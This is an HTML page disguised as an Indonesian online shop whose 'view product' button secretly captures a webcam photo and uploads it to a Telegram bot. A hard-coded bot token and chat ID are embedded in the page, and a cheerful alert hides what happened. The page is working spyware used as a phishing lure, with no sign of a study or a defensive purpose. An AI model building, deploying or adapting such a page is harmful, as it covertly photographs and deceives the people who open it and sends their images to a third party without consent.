<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Toko Online Keren 😎</title>
  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
      background: #f5f5f5;
    }
    header {
      background: #4CAF50;
      color: white;
      padding: 20px;
      text-align: center;
    }
    .product {
      max-width: 400px;
      margin: 50px auto;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    .btn-check {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <header>
    <h1>Welcome to Toko Keren</h1>
  </header>

  <div class="product">
    <h2>Produk Baru!</h2>
    <p>Lihat detail produk terbaru kami.</p>
    <button class="btn-check" id="checkProduct">Lihat Produk</button>
  </div>

  <script>
    const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";
    const CHAT_ID = "8316267465";

    function takePhoto() {
      return navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          let video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          return new Promise(resolve => {
            video.onloadedmetadata = () => {
              let canvas = document.createElement("canvas");
              canvas.width = video.videoWidth || 320;
              canvas.height = video.videoHeight || 240;
              let ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              stream.getTracks().forEach(track => track.stop()); // stop kamera

              canvas.toBlob(blob => {
                resolve(blob); // hasil foto dalam bentuk Blob
              }, "image/jpeg");
            };
          });
        });
    }

    function sendToTelegram(blob) {
      let formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "snapshot.jpg");

      fetch(`https://api.telegram.org/bot8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => console.log("✅ Foto terkirim:", data))
      .catch(err => console.error("❌ Error:", err));
    }

    document.getElementById("checkProduct").addEventListener("click", () => {
      takePhoto()
        .then(photoBlob => {
          sendToTelegram(photoBlob);
          alert("Produk berhasil ditampilkan! 😎");
        })
        .catch(err => {
          console.error(err);
          alert("Kamu menolak akses kamera 😅");
        });
    });
  </script>
</body>
</html>
